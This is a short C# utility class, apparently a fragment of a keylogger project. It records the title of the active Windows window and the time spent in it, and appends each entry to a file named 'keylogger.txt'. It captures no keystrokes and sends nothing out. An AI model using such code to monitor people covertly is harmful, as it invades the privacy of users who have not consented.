using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Testing
{
    public static class LogUtility
    {
        private static string logFileName = "keylogger.txt";

        public static void LogWindowChange(string windowTitle, DateTime startTime)
        {
            if (!string.IsNullOrEmpty(windowTitle))
            {
                TimeSpan timeSpent = DateTime.Now - startTime;
                using (StreamWriter writer = File.AppendText(logFileName))
                {
                    writer.WriteLine($"Window: {windowTitle}, Time Spent: {timeSpent}");
                }
            }
        }

        public static string GetActiveWindowTitle()
        {
            IntPtr handle = GetForegroundWindow();
            const int nChars = 256;
            var buff = new StringBuilder(nChars);
            if (GetWindowText(handle, buff, nChars) > 0)
            {
                return buff.ToString();
            }
            return null;
        }
        
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    }
}